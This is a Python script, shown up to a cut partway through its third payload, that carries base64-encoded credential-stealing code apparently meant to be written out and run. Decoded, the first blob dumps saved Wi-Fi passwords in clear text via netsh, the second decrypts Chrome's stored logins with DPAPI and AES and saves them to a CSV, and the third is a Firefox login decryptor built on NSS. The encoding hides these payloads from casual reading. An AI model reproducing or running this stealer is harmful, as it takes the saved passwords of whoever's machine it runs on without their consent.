import base64
import subprocess
import os

wifi_password = """
QGVjaG8gb2ZmCmVjaG8gJWRhdGUlICV0aW1lJT4+c2VuaGFzX3dpZmkudHh0CmVjaG8gJXVzZXJuYW1lJT4+c2VuaGFzX3dpZmkudHh0CmVjaG8gLSA+PnNlbmhhc193aWZpLnR4dApuZXRzaCB3bGFuIHNob3cgcHJvZmlsZSBuYW1lPSoga2V5PWNsZWFyID4+c2VuaGFzX3dpZmkudHh0CmVjaG8gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gPj4gc2VuaGFzX3dpZmkudHh0
"""
chrome_password = """
aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQganNvbgppbXBvcnQgYmFzZTY0CmltcG9ydCBzcWxpdGUzCmZyb20gd2luMzIgaW1wb3J0IHdpbjMyY3J5cHQKZnJvbSBDcnlwdG9kb21lLkNpcGhlciBpbXBvcnQgQUVTCmltcG9ydCBzaHV0aWwKaW1wb3J0IGNzdgoKQ0hST01FX1BBVEhfTE9DQUxfU1RBVEUgPSBvcy5wYXRoLm5vcm1wYXRoKHIiJXNcQXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxMb2NhbCBTdGF0ZSIlKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10pKQpDSFJPTUVfUEFUSCA9IG9zLnBhdGgubm9ybXBhdGgociIlc1xBcHBEYXRhXExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhIiUob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSkpCgpkZWYgZ2V0X3NlY3JldF9rZXkoKToKICAgIHRyeToKICAgICAgICAjKDEpIEdldCBzZWNyZXRrZXkgZnJvbSBjaHJvbWUgbG9jYWwgc3RhdGUKICAgICAgICB3aXRoIG9wZW4oIENIUk9NRV9QQVRIX0xPQ0FMX1NUQVRFLCAiciIsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgICAgIGxvY2FsX3N0YXRlID0gZi5yZWFkKCkKICAgICAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGxvY2FsX3N0YXRlKQogICAgICAgIHNlY3JldF9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWyJvc19jcnlwdCJdWyJlbmNyeXB0ZWRfa2V5Il0pCiAgICAgICAgI1JlbW92ZSBzdWZmaXggRFBBUEkKICAgICAgICBzZWNyZXRfa2V5ID0gc2VjcmV0X2tleVs1Ol0KICAgICAgICBzZWNyZXRfa2V5ID0gd2luMzJjcnlwdC5DcnlwdFVucHJvdGVjdERhdGEoc2VjcmV0X2tleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0KICAgICAgICByZXR1cm4gc2VjcmV0X2tleQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCIlcyIlc3RyKGUpKQogICAgICAgIHByaW50KCJbRVJSXSBDaHJvbWUgc2VjcmV0a2V5IGNhbm5vdCBiZSBmb3VuZCIpCiAgICAgICAgcmV0dXJuIE5vbmUKICAgIApkZWYgZGVjcnlwdF9wYXlsb2FkKGNpcGhlciwgcGF5bG9hZCk6CiAgICByZXR1cm4gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKCmRlZiBnZW5lcmF0ZV9jaXBoZXIoYWVzX2tleSwgaXYpOgogICAgcmV0dXJuIEFFUy5uZXcoYWVzX2tleSwgQUVTLk1PREVfR0NNLCBpdikKCmRlZiBkZWNyeXB0X3Bhc3N3b3JkKGNpcGhlcnRleHQsIHNlY3JldF9rZXkpOgogICAgdHJ5OgogICAgICAgICMoMy1hKSBJbml0aWFsaXNhdGlvbiB2ZWN0b3IgZm9yIEFFUyBkZWNyeXB0aW9uCiAgICAgICAgaW5pdGlhbGlzYXRpb25fdmVjdG9yID0gY2lwaGVydGV4dFszOjE1XQogICAgICAgICMoMy1iKSBHZXQgZW5jcnlwdGVkIHBhc3N3b3JkIGJ5IHJlbW92aW5nIHN1ZmZpeCBieXRlcyAobGFzdCAxNiBiaXRzKQogICAgICAgICNFbmNyeXB0ZWQgcGFzc3dvcmQgaXMgMTkyIGJpdHMKICAgICAgICBlbmNyeXB0ZWRfcGFzc3dvcmQgPSBjaXBoZXJ0ZXh0WzE1Oi0xNl0KICAgICAgICAjKDQpIEJ1aWxkIHRoZSBjaXBoZXIgdG8gZGVjcnlwdCB0aGUgY2lwaGVydGV4dAogICAgICAgIGNpcGhlciA9IGdlbmVyYXRlX2NpcGhlcihzZWNyZXRfa2V5LCBpbml0aWFsaXNhdGlvbl92ZWN0b3IpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0X3BheWxvYWQoY2lwaGVyLCBlbmNyeXB0ZWRfcGFzc3dvcmQpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzcy5kZWNvZGUoKSAgCiAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoIiVzIiVzdHIoZSkpCiAgICAgICAgcHJpbnQoIltFUlJdIFVuYWJsZSB0byBkZWNyeXB0LCBDaHJvbWUgdmVyc2lvbiA8ODAgbm90IHN1cHBvcnRlZC4gUGxlYXNlIGNoZWNrLiIpCiAgICAgICAgcmV0dXJuICIiCiAgICAKZGVmIGdldF9kYl9jb25uZWN0aW9uKGNocm9tZV9wYXRoX2xvZ2luX2RiKToKICAgIHRyeToKICAgICAgICBwcmludChjaHJvbWVfcGF0aF9sb2dpbl9kYikKICAgICAgICBzaHV0aWwuY29weTIoY2hyb21lX3BhdGhfbG9naW5fZGIsICJMb2dpbnZhdWx0LmRiIikgCiAgICAgICAgcmV0dXJuIHNxbGl0ZTMuY29ubmVjdCgiTG9naW52YXVsdC5kYiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoIiVzIiVzdHIoZSkpCiAgICAgICAgcHJpbnQoIltFUlJdIENocm9tZSBkYXRhYmFzZSBjYW5ub3QgYmUgZm91bmQiKQogICAgICAgIHJldHVybiBOb25lCiAgICAgICAgCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICB0cnk6CiAgICAgICAgI0NyZWF0ZSBEYXRhZnJhbWUgdG8gc3RvcmUgcGFzc3dvcmRzCiAgICAgICAgd2l0aCBvcGVuKCdjaHJvbWVfcGFzc3dvcmRzLmNzdicsIG1vZGU9J3cnLCBuZXdsaW5lPScnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBkZWNyeXB0X3Bhc3N3b3JkX2ZpbGU6CiAgICAgICAgICAgIGNzdl93cml0ZXIgPSBjc3Yud3JpdGVyKGRlY3J5cHRfcGFzc3dvcmRfZmlsZSwgZGVsaW1pdGVyPScsJykKICAgICAgICAgICAgY3N2X3dyaXRlci53cml0ZXJvdyhbImluZGV4IiwidXJsIiwidXNlcm5hbWUiLCJwYXNzd29yZCJdKQogICAgICAgICAgICAjKDEpIEdldCBzZWNyZXQga2V5CiAgICAgICAgICAgIHNlY3JldF9rZXkgPSBnZXRfc2VjcmV0X2tleSgpCiAgICAgICAgICAgICNTZWFyY2ggdXNlciBwcm9maWxlIG9yIGRlZmF1bHQgZm9sZGVyICh0aGlzIGlzIHdoZXJlIHRoZSBlbmNyeXB0ZWQgbG9naW4gcGFzc3dvcmQgaXMgc3RvcmVkKQogICAgICAgICAgICBmb2xkZXJzID0gW2VsZW1lbnQgZm9yIGVsZW1lbnQgaW4gb3MubGlzdGRpcihDSFJPTUVfUEFUSCkgaWYgcmUuc2VhcmNoKCJeUHJvZmlsZSp8XkRlZmF1bHQkIixlbGVtZW50KSE9Tm9uZV0KICAgICAgICAgICAgZm9yIGZvbGRlciBpbiBmb2xkZXJzOgogICAgICAgICAgICAJIygyKSBHZXQgY2lwaGVydGV4dCBmcm9tIHNxbGl0ZSBkYXRhYmFzZQogICAgICAgICAgICAgICAgY2hyb21lX3BhdGhfbG9naW5fZGIgPSBvcy5wYXRoLm5vcm1wYXRoKHIiJXNcJXNcTG9naW4gRGF0YSIlKENIUk9NRV9QQVRILGZvbGRlcikpCiAgICAgICAgICAgICAgICBjb25uID0gZ2V0X2RiX2Nvbm5lY3Rpb24oY2hyb21lX3BhdGhfbG9naW5fZGIpCiAgICAgICAgICAgICAgICBpZihzZWNyZXRfa2V5IGFuZCBjb25uKToKICAgICAgICAgICAgICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgICAgICAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnMiKQogICAgICAgICAgICAgICAgICAgIGZvciBpbmRleCxsb2dpbiBpbiBlbnVtZXJhdGUoY3Vyc29yLmZldGNoYWxsKCkpOgogICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSBsb2dpblswXQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGxvZ2luWzFdCiAgICAgICAgICAgICAgICAgICAgICAgIGNpcGhlcnRleHQgPSBsb2dpblsyXQogICAgICAgICAgICAgICAgICAgICAgICBpZih1cmwhPSIiIGFuZCB1c2VybmFtZSE9IiIgYW5kIGNpcGhlcnRleHQhPSIiKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMoMykgRmlsdGVyIHRoZSBpbml0aWFsaXNhdGlvbiB2ZWN0b3IgJiBlbmNyeXB0ZWQgcGFzc3dvcmQgZnJvbSBjaXBoZXJ0ZXh0IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyg0KSBVc2UgQUVTIGFsZ29yaXRobSB0byBkZWNyeXB0IHRoZSBwYXNzd29yZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3N3b3JkID0gZGVjcnlwdF9wYXNzd29yZChjaXBoZXJ0ZXh0LCBzZWNyZXRfa2V5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlNlcXVlbmNlOiAlZCIlKGluZGV4KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJVUkw6ICVzXG5Vc2VyIE5hbWU6ICVzXG5QYXNzd29yZDogJXNcbiIlKHVybCx1c2VybmFtZSxkZWNyeXB0ZWRfcGFzc3dvcmQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIioiKjUwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyg1KSBTYXZlIGludG8gQ1NWIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3N2X3dyaXRlci53cml0ZXJvdyhbaW5kZXgsdXJsLHVzZXJuYW1lLGRlY3J5cHRlZF9wYXNzd29yZF0pCiAgICAgICAgICAgICAgICAgICAgI0Nsb3NlIGRhdGFiYXNlIGNvbm5lY3Rpb24KICAgICAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICNEZWxldGUgdGVtcCBsb2dpbiBkYgogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSgiTG9naW52YXVsdC5kYiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoIltFUlJdICVzIiVzdHIoZSkp
"""
firefox_password = """
ZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCBhbm5vdGF0aW9ucwoKaW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBjc3YKaW1wb3J0IGN0eXBlcyBhcyBjdAppbXBvcnQganNvbgppbXBvcnQgbG9nZ2luZwppbXBvcnQgbG9jYWxlCmltcG9ydCBvcwppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IHNxbGl0ZTMKaW1wb3J0IHN5cwppbXBvcnQgc2h1dGlsCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUKZnJvbSBnZXRwYXNzIGltcG9ydCBnZXRwYXNzCmZyb20gaXRlcnRvb2xzIGltcG9ydCBjaGFpbgpmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IHJ1biwgUElQRSwgREVWTlVMTApmcm9tIHVybGxpYi5wYXJzZSBpbXBvcnQgdXJscGFyc2UKZnJvbSBjb25maWdwYXJzZXIgaW1wb3J0IENvbmZpZ1BhcnNlcgpmcm9tIHR5cGluZyBpbXBvcnQgT3B0aW9uYWwsIEl0ZXJhdG9yLCBBbnkKCkxPRzogbG9nZ2luZy5Mb2dnZXIKVkVSQk9TRSA9IEZhbHNlClNZU1RFTSA9IHBsYXRmb3JtLnN5c3RlbSgpClNZUzY0ID0gc3lzLm1heHNpemUgPiAyKiozMgpERUZBVUxUX0VOQ09ESU5HID0gInV0Zi04IgoKUFdTdG9yZSA9IGxpc3RbZGljdFtzdHIsIHN0cl1dCgoKZGVmIGdldF92ZXJzaW9uKCkgLT4gc3RyOgogICAgIiIiT2J0YWluIHZlcnNpb24gaW5mb3JtYXRpb24gZnJvbSBnaXQgaWYgYXZhaWxhYmxlIG90aGVyd2lzZSB1c2UKICAgIHRoZSBpbnRlcm5hbCB2ZXJzaW9uIG51bWJlcgogICAgIiIiCgogICAgZGVmIGludGVybmFsX3ZlcnNpb24oKToKICAgICAgICByZXR1cm4gIi4iLmpvaW4obWFwKHN0ciwgX192ZXJzaW9uX2luZm9fX1s6M10pKSArICIiLmpvaW4oX192ZXJzaW9uX2luZm9fX1szOl0pCgogICAgdHJ5OgogICAgICAgIHAgPSBydW4oWyJnaXQiLCAiZGVzY3JpYmUiLCAiLS10YWdzIl0sIHN0ZG91dD1QSVBFLCBzdGRlcnI9REVWTlVMTCwgdGV4dD1UcnVlKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHJldHVybiBpbnRlcm5hbF92ZXJzaW9uKCkKCiAgICBpZiBwLnJldHVybmNvZGU6CiAgICAgICAgcmV0dXJuIGludGVybmFsX3ZlcnNpb24oKQogICAgZWxzZToKICAgICAgICByZXR1cm4gcC5zdGRvdXQuc3RyaXAoKQoKCl9fdmVyc2lvbl9pbmZvX18gPSAoMSwgMSwgMCwgIitnaXQiKQpfX3ZlcnNpb25fXzogc3RyID0gZ2V0X3ZlcnNpb24oKQoKCmNsYXNzIE5vdEZvdW5kRXJyb3IoRXhjZXB0aW9uKToKICAgICIiIkV4Y2VwdGlvbiB0byBoYW5kbGUgc2l0dWF0aW9ucyB3aGVyZSBhIGNyZWRlbnRpYWxzIGZpbGUgaXMgbm90IGZvdW5kIiIiCgogICAgcGFzcwoKCmNsYXNzIEV4aXQoRXhjZXB0aW9uKToKICAgICIiIkV4Y2VwdGlvbiB0byBhbGxvdyBhIGNsZWFuIGV4aXQgZnJvbSBhbnkgcG9pbnQgaW4gZXhlY3V0aW9uIiIiCgogICAgQ0xFQU4gPSAwCiAgICBFUlJPUiA9IDEKICAgIE1JU1NJTkdfUFJPRklMRUlOSSA9IDIKICAgIE1JU1NJTkdfU0VDUkVUUyA9IDMKICAgIEJBRF9QUk9GSUxFSU5JID0gNAogICAgTE9DQVRJT05fTk9fRElSRUNUT1JZID0gNQogICAgQkFEX1NFQ1JFVFMgPSA2CiAgICBCQURfTE9DQUxFID0gNwoKICAgIEZBSUxfTE9DQVRFX05TUyA9IDEwCiAgICBGQUlMX0xPQURfTlNTID0gMTEKICAgIEZBSUxfSU5JVF9OU1MgPSAxMgogICAgRkFJTF9OU1NfS0VZU0xPVCA9IDEzCiAgICBGQUlMX1NIVVRET1dOX05TUyA9IDE0CiAgICBCQURfUFJJTUFSWV9QQVNTV09SRCA9IDE1CiAgICBORUVEX1BSSU1BUllfUEFTU1dPUkQgPSAxNgogICAgREVDUllQVElPTl9GQUlMRUQgPSAxNwoKICAgIFBBU1NTVE9SRV9OT1RfSU5JVCA9IDIwCiAgICBQQVNTU1RPUkVfTUlTU0lORyA9IDIxCiAgICBQQVNTU1RPUkVfRVJST1IgPSAyMgoKICAgIFJFQURfR09UX0VPRiA9IDMwCiAgICBNSVNTSU5HX0NIT0lDRSA9IDMxCiAgICBOT19TVUNIX1BST0ZJTEUgPSAzMgoKICAgIFVOS05PV05fRVJST1IgPSAxMDAKICAgIEtFWUJPQVJEX0lOVEVSUlVQVCA9IDEwMgoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBleGl0Y29kZSk6CiAgICAgICAgc2VsZi5leGl0Y29kZSA9IGV4aXRjb2RlCgogICAgZGVmIF9fdW5pY29kZV9fKHNlbGYpOgogICAgICAgIHJldHVybiBmIlByZW1hdHVyZSBwcm9ncmFtIGV4aXQgd2l0aCBleGl0IGNvZGUge3NlbGYuZXhpdGNvZGV9IgoKCmNsYXNzIENyZWRlbnRpYWxzOgogICAgIiIiQmFzZSBjcmVkZW50aWFscyBiYWNrZW5kIG1hbmFnZXIiIiIKCiAgICBkZWYgX19pbml0X18oc2VsZiwgZGIpOgogICAgICAgIHNlbGYuZGIgPSBkYgoKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUoZGIpOgogICAgICAgICAgICByYWlzZSBOb3RGb3VuZEVycm9yKGYiRVJST1IgLSB7ZGJ9IGRhdGFiYXNlIG5vdCBmb3VuZFxuIikKCgogICAgZGVmIF9faXRlcl9fKHNlbGYpIC0+IEl0ZXJhdG9yW3R1cGxlW3N0ciwgc3RyLCBzdHIsIGludF1dOgogICAgICAgIHBhc3MKCiAgICBkZWYgZG9uZShzZWxmKToKICAgICAgICAiIiJPdmVycmlkZSB0aGlzIG1ldGhvZCBpZiB0aGUgY3JlZGVudGlhbHMgc3ViY2xhc3MgbmVlZHMgdG8gZG8gYW55CiAgICAgICAgYWN0aW9uIGFmdGVyIGludGVyYWN0aW9uCiAgICAgICAgIiIiCiAgICAgICAgcGFzcwoKCmNsYXNzIFNxbGl0ZUNyZWRlbnRpYWxzKENyZWRlbnRpYWxzKToKICAgICIiIlNRTGl0ZSBjcmVkZW50aWFscyBiYWNrZW5kIG1hbmFnZXIiIiIKCiAgICBkZWYgX19pbml0X18oc2VsZiwgcHJvZmlsZSk6CiAgICAgICAgZGIgPSBvcy5wYXRoLmpvaW4ocHJvZmlsZSwgInNpZ25vbnMuc3FsaXRlIikKCiAgICAgICAgc3VwZXIoU3FsaXRlQ3JlZGVudGlhbHMsIHNlbGYpLl9faW5pdF9fKGRiKQoKICAgICAgICBzZWxmLmNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoZGIpCiAgICAgICAgc2VsZi5jID0gc2VsZi5jb25uLmN1cnNvcigpCgogICAgZGVmIF9faXRlcl9fKHNlbGYpIC0+IEl0ZXJhdG9yW3R1cGxlW3N0ciwgc3RyLCBzdHIsIGludF1dOgogICAgICAgIExPRy5kZWJ1ZygiUmVhZGluZyBwYXNzd29yZCBkYXRhYmFzZSBpbiBTUUxpdGUgZm9ybWF0IikKICAgICAgICBzZWxmLmMuZXhlY3V0ZSgKICAgICAgICAgICAgIlNFTEVDVCBob3N0bmFtZSwgZW5jcnlwdGVkVXNlcm5hbWUsIGVuY3J5cHRlZFBhc3N3b3JkLCBlbmNUeXBlICIKICAgICAgICAgICAgIkZST00gbW96X2xvZ2lucyIKICAgICAgICApCiAgICAgICAgZm9yIGkgaW4gc2VsZi5jOgogICAgICAgICAgICAjIHlpZWxkcyBob3N0bmFtZSwgZW5jcnlwdGVkVXNlcm5hbWUsIGVuY3J5cHRlZFBhc3N3b3JkLCBlbmNUeXBlCiAgICAgICAgICAgIHlpZWxkIGkKCiAgICBkZWYgZG9uZShzZWxmKToKICAgICAgICAiIiJDbG9zZSB0aGUgc3FsaXRlIGN1cnNvciBhbmQgZGF0YWJhc2UgY29ubmVjdGlvbiIiIgogICAgICAgIHN1cGVyKFNxbGl0ZUNyZWRlbnRpYWxzLCBzZWxmKS5kb25lKCkKCiAgICAgICAgc2VsZi5jLmNsb3NlKCkKICAgICAgICBzZWxmLmNvbm4uY2xvc2UoKQoKCmNsYXNzIEpzb25DcmVkZW50aWFscyhDcmVkZW50aWFscyk6CiAgICAiIiJKU09OIGNyZWRlbnRpYWxzIGJhY2tlbmQgbWFuYWdlciIiIgoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBwcm9maWxlKToKICAgICAgICBkYiA9IG9zLnBhdGguam9pbihwcm9maWxlLCAibG9naW5zLmpzb24iKQoKICAgICAgICBzdXBlcihKc29uQ3JlZGVudGlhbHMsIHNlbGYpLl9faW5pdF9fKGRiKQoKICAgIGRlZiBfX2l0ZXJfXyhzZWxmKSAtPiBJdGVyYXRvclt0dXBsZVtzdHIsIHN0ciwgc3RyLCBpbnRdXToKICAgICAgICB3aXRoIG9wZW4oc2VsZi5kYikgYXMgZmg6CiAgICAgICAgICAgIGRhdGEgPSBqc29uLmxvYWQoZmgpCgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBsb2dpbnMgPSBkYXRhWyJsb2dpbnMiXQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgTE9HLmVycm9yKGYiVW5yZWNvZ25pemVkIGZvcm1hdCBpbiB7c2VsZi5kYn0iKQogICAgICAgICAgICAgICAgcmFpc2UgRXhpdChFeGl0LkJBRF9TRUNSRVRTKQoKICAgICAgICAgICAgZm9yIGkgaW4gbG9naW5zOgogICAgICAgICAgICAgICAgeWllbGQgKAogICAgICAgICAgICAgICAgICAgIGlbImhvc3RuYW1lIl0sCiAgICAgICAgICAgICAgICAgICAgaVsiZW5jcnlwdGVkVXNlcm5hbWUiXSwKICAgICAgICAgICAgICAgICAgICBpWyJlbmNyeXB0ZWRQYXNzd29yZCJdLAogICAgICAgICAgICAgICAgICAgIGlbImVuY1R5cGUiXSwKICAgICAgICAgICAgICAgICkKCgpkZWYgZmluZF9uc3MobG9jYXRpb25zLCBuc3NuYW1lKSAtPiBjdC5DRExMOgogICAgIiIiTG9jYXRlIG5zcyBpcyBvbmUgb2YgdGhlIG1hbnkgcG9zc2libGUgbG9jYXRpb25zIiIiCiAgICBmYWlsX2Vycm9yczogbGlzdFt0dXBsZVtzdHIsIHN0cl1dID0gW10KCiAgICBPUyA9ICgiV2luZG93cyIsICJEYXJ3aW4iKQoKICAgIGZvciBsb2MgaW4gbG9jYXRpb25zOgogICAgICAgIG5zc2xpYiA9IG9zLnBhdGguam9pbihsb2MsIG5zc25hbWUpCgogICAgICAgIGlmIFNZU1RFTSBpbiBPUzoKICAgICAgICAgICAgIyBPbiB3aW5kb3dzIGluIG9yZGVyIHRvIGZpbmQgRExMcyByZWZlcmVuY2VkIGJ5IG5zczMuZGxsCiAgICAgICAgICAgICMgd2UgbmVlZCB0byBoYXZlIHRob3NlIGxvY2F0aW9ucyBvbiBQQVRICiAgICAgICAgICAgIG9zLmVudmlyb25bIlBBVEgiXSA9ICI7Ii5qb2luKFtsb2MsIG9zLmVudmlyb25bIlBBVEgiXV0pCiAgICAgICAgICAgICMgSG93ZXZlciB0aGlzIGRvZXNuJ3Qgc2VlbSB0byB3b3JrIG9uIGFsbCBzZXR1cHMgYW5kIG5lZWRzIHRvIGJlCiAgICAgICAgICAgICMgc2V0IGJlZm9yZSBzdGFydGluZyBweXRob24gc28gYXMgYSB3b3JrYXJvdW5kIHdlIGNoZGlyIHRvCiAgICAgICAgICAgICMgRmlyZWZveCdzIG5zczMuZGxsL2xpYm5zczMuZHlsaWIgbG9jYXRpb24KICAgICAgICAgICAgaWYgbG9jOgogICAgICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNkaXIobG9jKToKICAgICAgICAgICAgICAgICAgICAjIE5vIHBvaW50IGluIHRyeWluZyB0byBsb2FkIGZyb20gcGF0aHMgdGhhdCBkb24ndCBleGlzdAogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICAgICAgd29ya2RpciA9IG9zLmdldGN3ZCgpCiAgICAgICAgICAgICAgICBvcy5jaGRpcihsb2MpCgogICAgICAgIHRyeToKICAgICAgICAgICAgbnNzOiBjdC5DRExMID0gY3QuQ0RMTChuc3NsaWIpCiAgICAgICAgZXhjZXB0IE9TRXJyb3IgYXMgZToKICAgICAgICAgICAgZmFpbF9lcnJvcnMuYXBwZW5kKChuc3NsaWIsIHN0cihlKSkpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIG5zcwogICAgICAgIGZpbmFsbHk6CiAgICAgICAgICAgIGlmIFNZU1RFTSBpbiBPUyBhbmQgbG9jOgogICAgICAgICAgICAgICAgIyBSZXN0b3JlIHdvcmtkaXIgY2hhbmdlZCBhYm92ZQogICAgICAgICAgICAgICAgb3MuY2hkaXIod29ya2RpcikKCiAgICBlbHNlOgogICAgICAgIExPRy5lcnJvcigKICAgICAgICAgICAgIkNvdWxkbid0IGZpbmQgb3IgbG9hZCAnJXMnLiBUaGlzIGxpYnJhcnkgaXMgZXNzZW50aWFsICIKICAgICAgICAgICAgInRvIGludGVyYWN0IHdpdGggeW91ciBNb3ppbGxhIHByb2ZpbGUuIiwKICAgICAgICAgICAgbnNzbmFtZSwKICAgICAgICApCiAgICAgICAgTE9HLmVycm9yKAogICAgICAgICAgICAiSWYgeW91IGFyZSBzZWVpbmcgdGhpcyBlcnJvciBwbGVhc2UgcGVyZm9ybSBhIHN5c3RlbS13aWRlICIKICAgICAgICAgICAgInNlYXJjaCBmb3IgJyVzJyBhbmQgZmlsZSBhIGJ1ZyByZXBvcnQgaW5kaWNhdGluZyBhbnkgIgogICAgICAgICAgICAibG9jYXRpb24gZm91bmQuIFRoYW5rcyEiLAogICAgICAgICAgICBuc3NuYW1lLAogICAgICAgICkKICAgICAgICBMT0cuZXJyb3IoCiAgICAgICAgICAgICJBbHRlcm5hdGl2ZWx5IHlvdSBjYW4gdHJ5IGxhdW5jaGluZyBmaXJlZm94X2RlY3J5cHQgIgogICAgICAgICAgICAiZnJvbSB0aGUgbG9jYXRpb24gd2hlcmUgeW91IGZvdW5kICclcycuICIKICAgICAgICAgICAgIlRoYXQgaXMgJ2NkJyBvciAnY2hkaXInIHRvIHRoYXQgbG9jYXRpb24gYW5kIHJ1biAiCiAgICAgICAgICAgICJmaXJlZm94X2RlY3J5cHQgZnJvbSB0aGVyZS4iLAogICAgICAgICAgICBuc3NuYW1lLAogICAgICAgICkKCiAgICAgICAgTE9HLmVycm9yKAogICAgICAgICAgICAiUGxlYXNlIGFsc28gaW5jbHVkZSB0aGUgZm9sbG93aW5nIG9uIGFueSBidWcgcmVwb3J0LiAiCiAgICAgICAgICAgICJFcnJvcnMgc2VlbiB3aGlsZSBzZWFyY2hpbmcvbG9hZGluZyBOU1M6IgogICAgICAgICkKCiAgICAgICAgZm9yIHRhcmdldCwgZXJyb3IgaW4gZmFpbF9lcnJvcnM6CiAgICAgICAgICAgIExPRy5lcnJvcigiRXJyb3Igd2hlbiBsb2FkaW5nICVzIHdhcyAlcyIsIHRhcmdldCwgZXJyb3IpCgogICAgICAgIHJhaXNlIEV4aXQoRXhpdC5GQUlMX0xPQ0FURV9OU1MpCgoKZGVmIGxvYWRfbGlibnNzKCk6CiAgICAiIiJMb2FkIGxpYm5zcyBpbnRvIHB5dGhvbiB1c2luZyB0aGUgQ0RMTCBpbnRlcmZhY2UiIiIKICAgIGlmIFNZU1RFTSA9PSAiV2luZG93cyI6CiAgICAgICAgbnNzbmFtZSA9ICJuc3MzLmRsbCIKICAgICAgICBsb2NhdGlvbnM6IGxpc3Rbc3RyXSA9IFsKICAgICAgICAgICAgIiIsICAjIEN1cnJlbnQgZGlyZWN0b3J5IG9yIHN5c3RlbSBsaWIgZmluZGVyCiAgICAgICAgICAgIG9zLnBhdGguZXhwYW5kdXNlcigiflxcQXBwRGF0YVxcTG9jYWxcXE1vemlsbGEgRmlyZWZveCIpLAogICAgICAgICAgICBvcy5wYXRoLmV4cGFuZHVzZXIoIn5cXEFwcERhdGFcXExvY2FsXFxGaXJlZm94IERldmVsb3BlciBFZGl0aW9uIiksCiAgICAgICAgICAgIG9zLnBhdGguZXhwYW5kdXNlcigiflxcQXBwRGF0YVxcTG9jYWxcXE1vemlsbGEgVGh1bmRlcmJpcmQiKSwKICAgICAgICAgICAgb3MucGF0aC5leHBhbmR1c2VyKCJ+XFxBcHBEYXRhXFxMb2NhbFxcTmlnaHRseSIpLAogICAgICAgICAgICBvcy5wYXRoLmV4cGFuZHVzZXIoIn5cXEFwcERhdGFcXExvY2FsXFxTZWFNb25rZXkiKSwKICAgICAgICAgICAgb3MucGF0aC5leHBhbmR1c2VyKCJ+XFxBcHBEYXRhXFxMb2NhbFxcV2F0ZXJmb3giKSwKICAgICAgICAgICAgIkM6XFxQcm9ncmFtIEZpbGVzXFxNb3ppbGxhIEZpcmVmb3giLAogICAgICAgICAgICAiQzpcXFByb2dyYW0gRmlsZXNcXEZpcmVmb3ggRGV2ZWxvcGVyIEVkaXRpb24iLAogICAgICAgICAgICAiQzpcXFByb2dyYW0gRmlsZXNcXE1vemlsbGEgVGh1bmRlcmJpcmQiLAogICAgICAgICAgICAiQzpcXFByb2dyYW0gRmlsZXNcXE5pZ2h0bHkiLAogICAgICAgICAgICAiQzpcXFByb2dyYW0gRmlsZXNcXFNlYU1vbmtleSIsCiAgICAgICAgICAgICJDOlxcUHJvZ3JhbSBGaWxlc1xcV2F0ZXJmb3giLAogICAgICAgIF0KICAgICAgICBpZiBub3QgU1lTNjQ6CiAgICAgICAgICAgIGxvY2F0a